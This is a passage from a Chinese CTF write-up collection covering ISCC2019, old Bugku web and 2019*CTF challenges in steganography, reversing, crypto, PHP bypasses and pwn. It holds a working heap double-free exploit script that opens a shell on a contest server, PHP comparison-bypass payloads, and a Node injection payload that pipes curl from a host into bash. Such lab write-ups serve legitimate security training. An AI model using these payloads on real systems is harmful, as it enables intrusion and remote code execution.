+= chr(int(i, 8)) f.close() print(base64.b64decode(result)) 3.运行。 4.Flag 到手~ 最危险的地方就是最安全的地方 附件： 下载 知识点：观察？ 步骤： 1.解包，发现是个图片，而且打不开。 2.那么 binwalk 走一波，似乎是个压缩文件。 3.解压看看。 4.进去一看，一大堆二维码。 5.每一个二维码内容都差不多。 6.看一下详细信息，发现有一个二维码特别大。 7.hex 编辑器打开看看，发现这么一段。 8.拷出来 Base64 解个码。 9.Flag 到手~提交中间的即可。 解密成绩单 附件： 下载 知识点：.Net 反编译 步骤： 1.解压，是个 exe。 2.PEID 看看，.Net？ 3.来，.Net 反编译走一波。https://github.com/icsharpcode/ILSpy/releases 4.然后来随意看看，看到 checkUsername 这个方法。看来用户名是 admin 了。 5.然后看到 checkPassword 这个方法，看来密码是 ISCCq19pc1Yhb6SqtGhliYH688feCH7lqQxtfa2MpOdONW1wmIleBo4TW5n 了。 6.输入进去试试。 7.Flag 到手~ Welcome 附件： 下载 知识点：密文分析 步骤： 1.解包，是个 Txt，打开看看。注意编码切成 GBK。 2.然后来统计一下每一组词的出现频率。这里我们将每组词 md5 之后作为 dict 的 key，便于处理。 import hashlib f = open(\"welcome.txt\", \"r\") s = f.readline().split(' ') def md5(str): m = hashlib.md5() m.update(str.encode()) h = m.hexdigest() return h result = {} for i in s: key = md5(i) if key not in result: print(i + \" \" + key) result[key] = 0 result[key] += 1 print(result)` 3.运行一下，结果如下。其中有四组的数比较多。 分别是： 洮蓠朩暒戶囗 萇條戶囗 萇條蓅烺計劃 洮蓠朩暒蓅烺計劃 4.想了蛮久，想试试是不是这四个词分别代表 0 和 1，然后每八位代表一个 ASCII 字符，那我们写个脚本来跑一下每种代表的组合，看能跑出来些什么。 import hashlib f = open(\"welcome.txt\", \"r\") s = f.readline().split(' ') def md5(str): m = hashlib.md5() m.update(str.encode()) h = m.hexdigest() return h for s1 in range(0, 2): for s2 in range(0, 2): for s3 in range(0, 2): for s4 in range(0, 2): dicts = {md5('洮蓠朩暒戶囗'): str(s1), md5('萇條戶囗'): str(s2), md5('萇條蓅烺計劃'): str(s3), md5('洮蓠朩暒蓅烺計劃'): str(s4)} result = '' for i in s: key = md5(i) if key in dicts: result += dicts[key] flag = \"\" for i in range(0, len(result), 8): flag += chr(int(result[i:i + 8], 2)) print(flag) 5.啊哈，还真跑出来了。 6.Flag 到手~最后一位自己修正下吧。 倒立屋 附件： 下载 知识点：LSB，脑洞 步骤： 1.解压，是个这样的图。 2.hex 编辑器打开看看，没看到什么端倪。 3.打开 StegSolve 看看。 4.点 Analyse–Data Extract，然后 Bit Planes 逐位试试，发现 RGB 都点到 0 的时候（这里显示不全- -用 Tab 切过去忙打上的）开头有东西。 5.直接提交不行，倒过来提交就行了。 6.Flag 到手~ 无法运行的exe 附件： 下载 知识点：分析，图片修复。 步骤： 1.解包看看，原本我是想图省事，就先拿 hex 编辑器打开看看了。没想到直接就看到里面是串 base64。 2.解个码看看，似乎是 png。 3.那就找个工具把它转成文件。 4.下载下来还是打不开。 5.找个工具修修。https://github.com/sherlly/PCRT 6.打开修复之后的图片看看，是个二维码。 7.扫描得到 Flag~ Flag 到手~ High起来！ 附件： 下载 知识点： MP3 隐写，当铺密码 步骤： 1.解包，打开，发现是个图片，但打不开。 2.那就 binwalk 走一波，有个压缩包。 3.解压看看，是个 MP3。 4.Audacity 打开看看，没看见什么端倪。 5.那么还是再回到之前这个 png 吧，hex 打开看看。发现开头有个 PNG，那么我们搜索 504B，把后面的其他数据去掉。 6.然后用 PCRT 修复下。 7.发现是个二维码。 8.扫描一下，得到 中口由羊口中中大中中中井。 9.似乎是当铺密码，解密试试。得到 201902252228 http://www.zjslove.com/3.decode/dangpu/index.html 10.再用 mp3stegohttps://www.petitcolas.net/steganography/mp3stego/ 来处理下。 cd 到这里。 Decode.exe -X 01.mp3 -P 201902252228 11.打开 01.mp3.txt，得到如下的 HTML Markup flag{PrEtTy_1ScC9012_gO0d} 12.上个 Python 脚本解码。 import HTMLParser s = 'flag{PrEtTy_1ScC9012_gO0d}' h = HTMLParser.HTMLParser() print(h.unescape(s)) 13.运行 14.Flag 到手~ 他们能在一起吗？ 附件： 下载 步骤： 1.是个二维码。 2.扫一下得 UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=，解码得 PASS%7B0K_I_L0V3_Y0u%21%7D，URL Decode 之后得 PASS{0K_I_L0V3_Y0u!}。看起来是密码。 3.binwalk 看下，还有个压缩文件。 4.解压，需要密码，填入上面得到的密码。 5.打开解压出来的文件。 6.Flag 到手~ PS: 我也想要女朋友呀ヾ(=･ω･=)o Keyes' secret 附件： 1558454024f70650512bf44e970cfb374b2ff43a0e下载 步骤： 1.解包之后是个文本文件。 2.题面有提示键盘。那么就考虑是键盘密码了。上网找个脚本来解。https://nitesculucian.github.io/2018/09/30/dctf-2018-message/ 这里我们就处理 {} 包起来的密文就好，因为这脚本里的字典和这题用到的还是有些不同的，要扩充太多就很累了。 最终 Python 脚本如下： keyboard = [ [[\" \"], [\"QWERTY\", \"ASDFGH\", \"ZXCVBN\"]], [[\"A\"], [\"XCVBGRD\", \"GRDXCVB\", \"ZSEFVCX\"]], [[\"B\"], [\"WSXCFD\", \"RFVBHG\", \"QAZXDS\", \"YHNMKJ\"]], [[\"C\"], [\"REDCV\", \"EWSXC\", \"TRFVB\"]], [[\"D\"], [\"EDCVGR\", \"WSXCFE\", \"YHNMKU\"]], [[\"E\"], [\"EDCVRF\", \"WSXCDE\", \"TGBNHY\"]], [[\"F\"], [\"REDCF\", \"TRFVG\", \"EWSXD\"]], [[\"G\"], [\"REDCVG\", \"CVGRED\", \"CVRGED\"]], [[\"H\"], [\"WSXDRFV\", \"EDCFTGB\", \"RFVGYHN\"]], [[\"I\"], [\"WSX\", \"EDC\", \"RFV\"]], [[\"J\"], [\"UJMN\", \"WSXZ\", \"RFVC\"]], [[\"K\"], [\"EDCFBY\", \"WSXDVR\", \"QAZSCE\"]], [[\"L\"], [\"WSXCV\", \"EDCVB\", \"RFVBN\"]], [[\"M\"], [\"ZAQWDRTGB\", \"XSWEFTYHN\", \"XSWEFTYNH\"]], [[\"N\"], [\"ZAQWDVFR\", \"XSWEFTGB\", \"XSWEFTBG\"]], [[\"O\"], [\"QAZXCDEW\", \"WSXCVFRE\", \"RFVBNHYT\", \"TGBNMJUY\"]], [[\"P\"], [\"MNBVCCDERTG\", \"NBVCXSWERF\", \"NBVCXSWEFR\"]], [[\"Q\"], [\"QAZXCDEWV\", \"EDCVBGTRN\", \"RFVBNHYTM\"]], [[\"R\"], [\"MNBVCDRTGHU\", \"MNBVCDRTGHU\", \"MNBVCDRTGHU\"]], [[\"S\"], [\"YTRFVCX\", \"IUYHNBV\", \"IUYHNBV\"]], [[\"T\"], [\"WERTYFV\", \"RTYUIHN\", \"RTYUIHN\"]], [[\"U\"], [\"WSXCVFR\", \"EDCVBGT\", \"EDCVBGT\"]], [[\"V\"], [\"EFVGY\", \"WDCFT\", \"WDCFT\"]], [[\"W\"], [\"EFVGYWDCFT\", \"EFVGYWDCFT\", \"EFVGYWDCFT\"]], [[\"X\"], [\"WDVTDZ\", \"RGNYGC\", \"RGNYGC\"]], [[\"Y\"], [\"JMYI\", \"EFVT\", \"EFVT\"]], [[\"Z\"], [\"QWERDCVB\", \"ERTGVBN\", \"ERTGVBN\"]] ] def nliqwerty_dec(buf): dec_buf = buf result = \"\" while len(dec_buf) > 0: if dec_buf[:1] == '{' or dec_buf[:1] == '}' or dec_buf[:1] == '.' or dec_buf[:1] == ',': result += dec_buf[:1] dec_buf = dec_buf[1:] continue is_found = False for i in range(11, 2, -1): for count in range(0, 27): for j in keyboard[count][1]: if dec_buf[:i] == j: result += keyboard[count][0][0] dec_buf = dec_buf[i:] is_found = True break if is_found: break print(result) nliqwerty_dec(\"{WSXIUYHNBVTRFVBTRFVBQWERTYQAZSCEWSXCDEEFVTYHNMKJTGBNMJUYGRDXCVBMNBVCDRTGHUWSXCFEQWERTYTRFVBWSXNBVCXSWERFRFVGYHNWSXCDEMNBVCDRTGHU}\") 3.运行 4.Flag 到手~ Aesop's secret 附件： 下载 知识点：拼图，AES 加密 步骤： 1.打开看看，是个 gif 图。而且一直在不同位置跳。 2.找个工具分解下。https://zh.bloggif.com/gif-extract 3.将其中间部分拼起来之后，是 “ISCC” 字样。 4.而后用 hex 编辑器打开这个 gif 看看。最后这里有一段 Base64。 5.解码之后 Salted__Pi 开头，说明是 AES 加密。 6.https://www.sojson.com/encrypt_aes.html 解密试试，密码就是上面拼出来的 “ISCC” 。 7.对解密得到的东西再解密一次。 8.Flag 到手~ 碎纸机 附件： 下载 知识点： 步骤： 1.打开看看，是个图片。 binwalk 走一波，有压缩包。 3.解压一下。 4.简单看看，是一堆拼图和一个文本文件。 文本文件内容如下： OpenCV？看来得从图片入手。 5.用 hex 编辑器打开这些图片，发现最后有东西。 6.将 FFD9 之后的十六进制值复制到文本编辑器，搜索 00，开高亮。 7.不断调整窗口大下，并设置让内容适应窗口大小。可以看到非 00 的部分是可以拼成字符的。 第一幅图看来就是 Fl 了。 8.对剩下几幅图也如法炮制。每幅图的内容可能有重复，自己看的时候细心些。 第二幅图： ag= 第三幅图： {ISC 第四幅图： C_ 第五幅图： is_s(这里比较难看，不过最后拼出来之后是个英语句子，所以可以按照内容修正下） 第六幅图： o_i 第七幅图： nter 第八幅图： esti 第九幅图： ng_ 第十幅图： !} 9.拼起来，就是 Flag={ISCC_is_so_interesting_!} 10.Flag 到手~ Reverse 转载自：安全客-ISCC2019部分writeup作者：Henu_摇光 answer to everything ida载入main函数一键f5，审计一波发现以下关键： 不带任何标签提交，结合题目提示sha1， kdudpeh 的sha1值即为所要flag dig dig dig 用IDA载入分析 发现对字符串进行了三次加密 分别为BASE64,ROT13,UUencode 对字符串逆着进行三次解密，得到flag 简单Python 题目内容很简单 提示说要逆向一个pyc 虽然没有了解过这个东西，不过在网上找到了在线的反编译工具 直接拉进去 运行 得到如下内容： import base64 def encode(message): s = '' for i in message: x = ord(i) ^ 32 x = x + 16 s += chr(x) return base64.b64encode(s) correct = 'eYNzc2tjWV1gXFWPYGlTbQ==' flag = '' print 'Input flag:' flag = raw_input() if encode(flag) == correct: print 'correct' else: print 'wrong' 这就很棒了 源码都有了 什么是逆不出来的 这里需要注意一下的是correct的内容最好不要用网上的Base64解码工具解码 最好用Python的base64模块解码 简单写一下Python得到decode后的字符串 yx83sskcY]`\\Ux8f`iSm 然后写一个脚本，跑一下就出来了 脚本如下： #include using namespace std; int main () { char buffer[512]=\"yx83sskcY]`\\Ux8f`iSm\"; for(int i=0;i结束。 Rev04 拉入od提示文件损坏，去百度elf文件的格式，发现其格式不固定，格式基本固定的地方又没有发现有什么明显的错误，但是记事本打开查看内容时发现一串极为可疑的字符： 数了下长度，符合base64加密的密文长度，base64转码，果然有问题： uggc://VFPP2019{hey_frrzf_ebggra_jvgu}pgs.pbz 显然是flag密文，多次解密尝试后发现是rot13加密，在线解rot13即可 Rev01 这是一个rust逆向。载入ida分析 需要留意，rust语言写出来的程序其主函数为“beginer_reverse::main::……..”，所以对main反编译是找不到正确的东西的。 进入之后即看到一串明显像是密文的东西。向下翻找到唯一一个具备加密转码性质的代码 其中 v33 恰是开头的v0，很明显就是将上面的内容转码后和输入进行比对，仔细审计中间的代码会发现v15对应的是输入。写出解密脚本： # coding=utf-8 cipher = [0x00000154,0x00000180,0x000001FC,0x000001E4,0x000001F8,0x00000154,0x00000190,0x000001BC,0x00001BC,0x000001B8,0x00000154,0x000001F8,0x0000194,0x00000154,0x000001B4,0x000001BC,0x00001F8,0x00000154,0x000001F4,0x00000188,0x00001AC,0x000001F8,0x00000154,0x0000018C,0x00001E4,0x00000154,0x00000190,0x000001BC,0x154,0x90] #以上数据经过转码后拿到数据要进行一次ascii码转换，但是第一次转出来的是str类型下的数字，不能直接输出ascii码对应的字符，所以需要用chr()处理一下 cipher2='' for i in range(len(cipher)): cipher2+=chr((cipher[i]>>2)^0xA) print cipher2 #也可以用一个直接点的代码处理 cipher1 = ''.join(map(lambda x: chr((x>>2) ^ 0xa), cipher)) print cipher1 Pwn 转载自：安全客-ISCC2019部分writeup作者：Henu_摇光 pwn02 from pwn import * #context.log_level = 'debug' IP = '39.100.87.24' PORT = 8102 LOCAL = 0 if LOCAL: sh = process('./pwn02') else: sh = remote(IP, PORT) def debug(cmd=''): gdb.attach(sh, cmd) pause() def malloc(idx, size, ctx): sh.recvuntil('&gt; ') sh.sendline('1 '+str(idx)) sh.sendline(str(size)) sh.sendline(ctx) def free(idx): sh.recvuntil('&gt; ') sh.sendline('2 '+str(idx)) def puts(idx): sh.recvuntil('&gt; ') sh.sendline('3 '+str(idx)) malloc(0, 0x58, \"aa\") malloc(1, 0x58, \"bb\") malloc(2, 0x58, \"cc\") malloc(3, 0x80, \"dd\") malloc(4, 0x10, \"ee\") # unsorted bin leak free(3) puts(3) leak = sh.recvuntil('x7f').ljust(8, \"x00\") leak = u64(leak) libc_base = 0 if LOCAL: libc_base = leak-3951480 else: libc_base = leak-3951480 # ubuntu 1604 server log.success(\"libc base: %s\" %hex(libc_base)) # double free free(0) free(1) free(0) payload = \"f\"*80 payload += p64(0)+p64(0x61) payload += p64(0x600dba) malloc(5, 0x58, payload) malloc(6, 0x58, \"gg\") system = libc_base + 0x45390 payload = \"h\"* 6 + p64(system)*2 malloc(7, 0x58, payload) malloc(8, 0x20, \"/bin/shx00\") free(8) #debug() sh.interactive() 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-20 21:55:18 0 issues reported "},"articals/oldbugku_web.html":{"url":"articals/oldbugku_web.html","title":"旧Bugku_Web","keywords":"","body":"旧版Bugku-Web 题目类型： 类型 年份 难度 网上练习题 无 易 题目下载： https://ctf.bugku.com/ 网上公开WP： https://www.cnblogs.com/Gzu_zb/category/1350848.html https://www.jianshu.com/p/51d976888807 本站备份WP: 作者：淡看 Web extract变量覆盖 extract函数的实例 file_get_contens函数，直接读入在一个字符串中 给出代码参考 根据题意 直接使两个值直接相等即可 payload:?shiyan=&flag= payload:?shiyan=&content= 拿到flag strcmp比较字符串 代码参考 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die('Flag: '.$flag); else print 'No'; } ?> strcmp直接使用数组绕过 构造payload :?a=[] 即可绕过 urldecode二次编码绕过 源码 eregi匹配字母字符串时忽略大小写 把J对应的url在此进行url加密 %4A->%254A 这里的二次是因为第一次加密的%4a直接被浏览器给解密了。之后在进行自己的加密变成了%254A。 被php源码解密一次，浏览器解密一次就直接ok了 得到flag 其他的字母替换均无效 payload:?id=hackerD%254A MD5()函数 源码 想到了md5缺陷的两种利用方法 0e的科学计数法 构造0e payload 尝试绕过 ?username=s155964671a&password=0e342768416822451524974117254469 无法绕过 \\ 使用数组缺陷绕过 构造payload:?username[]=1&password[]=0e 数组返回NULL绕过 源码 ereg和eregi差不多的，区别在于是否匹配大小写 if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)为了判断是否有输入数字、字母 1.数组绕过 payload:?password[]=@ 2.截断 payload:?password[]=%00 弱类型整数大小比较绕过 源码 1336){ echo $flag; ?> 一眼看出矛盾 给传入的password套上了单引号，为字符串 下面又判断是否为数字，是的话要大于1336才输出flag 这里明显就矛盾了。 尝试数组直接绕过处理 payload:password[]=1 sha()函数比较绕过 再次供上代码 sha1再次用数组绕过 payload:?name[]=1&password[]=2 md5加密相等绕过 利用php的hash缺陷直接绕过 代码如上，构造payload?a=s155964671a 因为在php中科学记数法表示的0e开头的都认为为0 所以直接构造 https://www.cnblogs.com/Primzahl/p/6018158.html 这里扔出一个hash缺陷的列表网站供查看 十六进制与数字比较 源码 = $one) && ($digit 传入password转化为temp 之后进行操作 php转码把16进制转化为10进制 3735929054转换成16进制为0xdeadc0de，记得带上0x； payload:?password=0xdeadc0de ereg正则%00绕过 源码 9999999) { if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置 { die('Flag: ' . $flag); } else { echo('- have not been found'); } } else { echo 'Invalid password'; } } ?> ereg()的正则限限制了多个数字或者大小写字母 strpos()则是查找'-' 1.数组绕过 payload:?password[]=1 2.%00截断绕过 payload:?password=1e9%00- strpos数组绕过 源码 题目说了数组绕过，直接构造payload payload:?ctf[]=1 数字验证正则绕过 这题比较难，直接参考别人大佬的 = preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配 { echo 'flag'; exit; } while (TRUE) { $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 > preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) { if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; } if ($c =3，必须包含四种类型三种与三种以上 if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit; } } ?> 参考：https://foxgrin.github.io/posts/25617/ 之后看懂了后，会把自己的思路重现一次的 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-05-03 01:05:23 0 issues reported "},"articals/2019starctf.html":{"url":"articals/2019starctf.html","title":"2019*CTF","keywords":"","body":"2019*CTF 题目类型： 类型 年份 难度 官方赛事题 2019 难 题目下载： https://github.com/sixstars/starctf2019 网上公开WP: https://www.anquanke.com/post/id/177490 https://xz.aliyun.com/t/5002 https://xz.aliyun.com/t/5006 https://www.anquanke.com/post/id/177582 https://www.anquanke.com/post/id/177596 https://www.secpulse.com/archives/105333.html 本站备份WP: 原文来自安全客、原文作者[安胜ANSCEN]; MISC She Enjoy the game!HINT：Please combine numbers in the order of the rooms 解题: 通过分析下载文件发现是使用RPG Makr XP制作的一款游戏，下载RPG Maker XP V1.03 .exe软件，创建新项目，将项目中的Game.rxproj放到She目录下，打开文件即可进行游戏编辑，通过分析代码将第一只BOOS的攻击改为1。 通过老鹰后，显示一些提示，会有幽灵找你，碰到要重新开始，通过编辑器将幽灵删除。 有9个门，测试后37无条件打开，双击门判断门打开的前提条件，发现382157这个顺序，按照该顺序获取到的数值是371269，按照房间顺序排列得到213697。 根据提示将拿到的数字进行MD5加密，得到d6f3fdffbcb462607878af65d059f274，即为flag。 babyflash Recently my younger brother learnt how to make a flash.Here’s his first work. 解题 用JPEXS反编译flash.swf得到441张黑白图片和1个mp3文件。 令黑的为1、白的为0利用python处理。 生成二维码。 得到*ctf{halfflag&，用audacity打开mp3以频谱图显示。 最后flag*ctf{halfflag&&_the_rest}。 otaku One day,you and your otaku friend went to the comic expo together and he had a car accident right beside you.Before he died,he gave you a USB hard disk which contained this zip.Please find out his last wish.提示：The txt is GBK encoding. 解题 用winhex等工具打开压缩包去掉伪加密09标识，得到doc的一段话。 Hello everyone, I am Gilbert. Everyone thought that I was killed, but actually I survived. Now that I have no cash with me and I’m trapped in another country. I cant contact Violet now. She must be desperate to see me and I dont want her to cry for me. I need to pay 300 for the train, and 88 for the meal. Cash or battlenet point are both accepted. I dont play the Hearthstone, and I dont even know what is Rastakhans Rumble. 利用python处理，将此写入txt，编码为gbk。 根据注释： 压缩软件：winrar版本 5.70 beta 2 配置：zip压缩文件（低压缩率） 压缩方式：标准 下载winrar 压缩后进行明文攻击，密钥从1开始。 成功得到口令My_waifu，再解压图片zsteg flag.png，最后得到flag*ctf{vI0l3t_Ev3rg@RdeN}。 Sokoban Lets play another Sokoban game. You only have 60 seconds to complete 25 levels,the number of boxes is greater than or equal to 1,less than or equal to 3,and the map size is at most 12*10. $ nc 34.92.121.149 9091 解题 根据题目提示进行nc连接。 发现是一个推箱子的游戏，需要找到最优解（路径最短），且在60秒内完成25个关卡。 C++编程实现找到最优解并提交通关。 文件夹下两个CPP为源文件，a为编译后的脚本部分代码： 运行结果： CRYPTO babyprng $ nc 34.92.185.118 10002 解题 根据题目提示进行nc连接。 下载py文件，根据程序了解，需要输入四个字符（字母数字）和随机的一串字符进行sha256加密，密文要等于给的那串。 py脚本： 输入正确的四个字符后进入下一步，需要输入十六进制数。按题目中的程序，十六进制数有取值范围，使用py脚本暴力破解符合条件的数。 由于原本题目中的size为100000，本地根本跑不出来，修改size数值后获取了一个十六进制数。 babyprng2 nc 34.92.185.118 10003 解题 第二题和第一题类似，第一步还是sha256，只是第二步多了些十六进制数匹配和数值修改。 py脚本： 这里size数值取1，十六进制数为5个，得到结果0004350106。 但在本地测试数值是否正确时，提交几遍后才出flag。在赛题环境中手动提交一直失败，而且在重新跑过脚本后出来的结果又不同，怀疑为脚本问题，但本地提交多次都成功，可能为最后随机数的问题，最终以一个PHP脚本提交答案。 获取flag。 notcurves !!!this challenge is under maintaince. !!! For the sake of fairness you can download the old script.this challenge is up now! the file has been updated, you can download the old script at here.$ nc 34.85.45.159 20005 解题 分析Python脚本源程序，发现其是两层加密，第一层是破解SHA256，求出输入字符的前4个字符，其破解SHA256的Python源代码如下。 将上面破解求出的4个字母字符，提交服务器即可进入第二层破解算法。 分析上述代码，进入这里的时候，前面很多应该是扰乱代码，输入”5”可进入下一步，输入一个坐标点(u,v)，使其满足条件：(u*v)%p==0，这里的p是两个15比特素数的乘积，尝试多次输入两个素数，才使其满足前面的条件。后来总结时发现其实是可以输入(0,0)的，这可能是出题者的一个失误。 WEB mywebsql 提示： 图29 解题 通过admin/admin弱口令登录。 找到一个Mywebsql漏洞： https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md Create a test table (code) and write a shell code in this table. Shell地址： 使用perl反弹shell。 转义单引号并url编码，根目录下有readflag和flag文件，执行readflag脚本提示一个算术题，需提交答案。由于无法直接输入，所以需要脚本实现结果的输入。 使用PHP的proc_open来执行/readflag，并算出随机算式的答案重定向到程序中获取flag，附上脚本代码。 Echohub how2stack提示： run.sh =&gt;#!/bin/sh service —status-all | awk {print $4}| xargs -i service {} start sleep infinity; I am sorry for that `sandbox.php` is basically no use, so this challenge can be solved more easily. 解题 进入题目，发现在data中提交任意字符都会返回phpinfo，而提交长度过大时会提示emmmmmm…Dont attack me!，查看页面代码，发现提示： 提交之后得到源代码。查看phpinfo，发现disable_functions禁用很多，但是move_uploaded_file函数拼错了，所以可以利用其上传文件到指定目录，但open_basedir中的目录不存在，所以实际上无法使用。发现stream_socket_client、fputs、fgets、create_function这些函数没有禁止，所以可以利用其构造一个简易的phpshell。 查看index.php代码，通过混淆加密的方式加密代码，解密之后，查看源代码，提示“emmmmmm…Dont attack me!”时应该是出现了栈溢出，采用srand函数使用时间戳对随机数进行布种，而时间戳可以通过phpinfo中的server变量得到，故本题中的随机数都可以预判。 预判其栈结构。 修改index.php代码，将关键部分改掉，改成可以生成poc的程序。 这样就形成简易版poc程序，可以得到一个在30秒后执行命令的exp，由于php的create_function函数存在注入漏洞，通过该poc程序，调用create_function函数，就可以执行任意代码。 这就是构造完毕的exp，在服务器上观察一个端口，该exp成功执行后，就可以得到一个php的shell，可以执行任意php代码，执行结果通过ob_flush();flush();可以输出到页面上，也可以赋值给$s变量回显到shell上。 接下来就跟0ctf-2019一样，这里引用某篇文章说明。 虽然这个没有真正做出来，但指明了方向，即使用php-fpm修改php_value来执行命令，php_value中虽然无法修改disable_functions，但是可以修改sendmail_path的地址达到命令执行的效果，而虽然禁用了mail，但是php中发送邮件的函数很多，例如error_log函数。 然后在发送数据包的地方输出。（服务器禁用了fsocket系列函数，所以该poc无法正常运行。） 然后在服务器上再观察一次端口，将phpshell中得到的BASE64_CODE通过stream_socket_client发送给php-fpm，这样就能在服务器上运行任意命令了，此时反弹一个cmdshell回来。 得到cmdshell后，执行readflag，发现输出跟之前的题目类似，则使用之前题目readflag的程序，通过eval得到flag。 996_game 首先我们找到藏着HTML源码里的提示： 这是一个开源的HTML5游戏 https://github.com/Jerenaux/phaserquest 我们可以看到这里有个静态文件泄露漏洞 https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44 app.use('/css',express.static(__dirname + '/css')); app.use('/js',express.static(__dirname + '/js')); app.use('/assets',express.static(__dirname + '/assets')); 现在，我们需要找到一个方式使mongodb数据库报错 这里我们唯一可以控制的点是id,所以我们一个去跟踪ObjectId()函数。 https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28 ... var valid = ObjectID.isValid(id); ... ObjectID.isValid = function isValid(id) { if(id == null) return false; if(typeof id == 'number') { return true; } if(typeof id == 'string') { return id.length == 12 || (id.length == 24 && checkForHexRegExp.test(id)); } if(id instanceof ObjectID) { return true; } if(id instanceof _Buffer) { return true; } // Duck-Typing detection of ObjectId like objects if(id.toHexString) { return id.id.length == 12 || (id.id.length == 24 && checkForHexRegExp.test(id.id)); } return false; }; 我们可以使用 id = {\"id\":{\"length\":12}} 来绕过这里. ... if(!valid && id != null){ throw new Error(\"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters\"); } else if(valid && typeof id == 'string' && id.length == 24 && hasBufferType) { return new ObjectID(new Buffer(id, 'hex')); } else if(valid && typeof id == 'string' && id.length == 24) { return ObjectID.createFromHexString(id); } else if(id != null && id.length === 12) { // assume 12 byte string this.id = id; } else if(id != null && id.toHexString) { // Duck-typing to support ObjectId from different npm packages return id; } else { throw new Error(\"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters\"); } ... 现在，我们的payload变成了：id = {\"length\":0,\"toHexString\":true,\"id\":{\"length\":12}}, 完整的payload将会发送到mongodb服务器上。 MongoDB shell version: 2.6.10 connecting to: test > db.a.find({\"b\":{\"$gt\":1,\"c\":\"d\"}}) error: { \"$err\" : \"Can't canonicalize query: BadValue unknown operator: c\", \"code\" : 17287 } 完整的payload如下 Client.socket.emit('init-world',{new:false,id:{\"$in\":[1],\"require('child_process').exec('/usr/bin/curl host/shell2|bash')\":\"bbb\",\"length\":0,\"toHexString\":true,\"id\":{\"length\":12}},clientTime:\"sacsaccsacsac\"}); REVERSE yy Do you love yy ? 解题 程序逻辑： 根据给定的规则解析并处理输入。 思路： 根据yyec可以得到合法字符集：_CTF{abcdefghijklmnopqrstuvwxyz0123456789}； 根据输入取表并更新buffer，使用roundkey加密buffer(aes_cbc_encrypt)，字符表示进行下一轮处理(重置buffer)，将得到的结果与加密串比较； 输入字符与box的对应关系； aes_cbc_decrypt即可得到flag； flag: CTF{yy_funct10n_1s_h4rd_and_n0_n33d_to_r3v3rs3} 。 Obfuscating Macros II You have seen something like this before,I guess. 解题 程序类似表达式计算。 程序逻辑： 根据输入的两个DWORD64进行计算，并与给定的两个DWORD64比较。 思路： 程序有固定的处理模式： if (xx) { do stuff }； 在对应的模式处下断即可得到完整的处理逻辑。 flag：*CTF{fUnfl@tCf9}。 Matr1x What information is hidden in the matrix? 解题 3_3魔方 程序逻辑: 魔方每个面上的点都有1个值，计为DWORD v[6][3][3]，根据输入旋转魔方，计算每个面上点的值。 sum(corner + center) == 给定的值1， sum(middle + center) == 给定的值2， 计算每个面上的点与另一个数组的点乘， 得到6个DWORD作为flag输出。 思路: 3个点集合：corner(4_6)、middle(4_6)、center(6)。 穷举可以确定每个面center、middle、center的值(每个点的具体顺序未确定)，计算flag并以_CTF{..}作为过滤条件即可得到flag。 flag: *CTF{7h1S_Cu63_is_m4g1c}。 fanoGo Do you kown go & fano encode? $ nc 34.92.37.22 10001 解题 Go程序 程序逻辑： 以字典文件corpus.txt初始化编码器； if Fano.Decode(输入) == 给定字符串：输出flag。 思路： 程序中同时存在Fano.Encode函数，patch程序调用Fano.Encode(给定字符串)并输出。 flag：*CTF{NUY4a3E5D9186hVzejoyItr7xHBcmOpv}。 PWN quicksort I’m very quick!$ nc 34.92.96.238 10000 解题 1.输入存在栈溢出； 图51 2.栈溢出覆盖ptr即可实现任意地址任意写； 3.修改ptr指向got表，即可泄漏libc基址； 4.修改atoi为system，输入/bin/sh;即可获得shell。 py脚本： girlfriend new libc, new life. $ nc 34.92.96.238 10001 解题 1.Double free； 2.申请大于0x400的堆，然后释放，可以获得main_aren_top的地址； 3.Libc2.29在free时会检查free的地址是否已经在tcache中，要先填满tcache再触发double free； 4.fastbin attack修改free_hook指向system； 5.触发free(“/bin/sh;”)。 py脚本： babyshell An easy shellcode $ nc 34.92.37.22 10002 解题 遇到0时就停止检查，在shellcode前加上push 0即可绕过检查。 py脚本： blindpwn Close your eyes!$ nc 34.92.37.22 10000checksec：Arch：amd64-64-littleRELRO：Partial RELROStack：No canary foundNX：NX enabledPIE：No PIE (0x400000)file libc:libc-2.23.so： ELF 64-bit LSB shared object,x86-64, version 1 (GNU/Linux)，dynamicallylinked, interpreter /lib64/ld-linux-x86-64.so.2,BuildID[sha1]=b5381a457906d279073822a5ceb2 解题 本题没有提供程序，给了服务器和端口，没有aslr和栈保护。 1.链接后提示”Welcome to this blind pwn!”，输入任意内容，提示”Goodbye!”； 2.输入1个超长字符串，没有看到”Goodbye!”，说明溢出了； 3.确定返回地址的位置，修改返回地址(从0x400000开始)，直接有返回输出； 4.从输出中得到libc基址，one_gadget get shell。 upxofcpp $ nc 34.92.121.149 10000 解题 1.用upx脱壳； 2.存在UAF漏洞； 3.upx加壳的堆可执行，可以在堆上构造shellcode； 4.申请一个size为6的vec_0和一个size为10的vec_1，释放vec_0后，vec_0的vtb便指向堆，然后释放vec_1，再申请一个size为6的vec_3，直接输入-1，就可以不破坏vec_0的vtb； 5.同上的方法可以使vtb+0x10也指向堆； 6.在vtb+0x10指向的地方构造shellcode； 7.调用show，触发vtb+0x10。 py脚本： 评论区 请文明评论，禁止广告 CTF 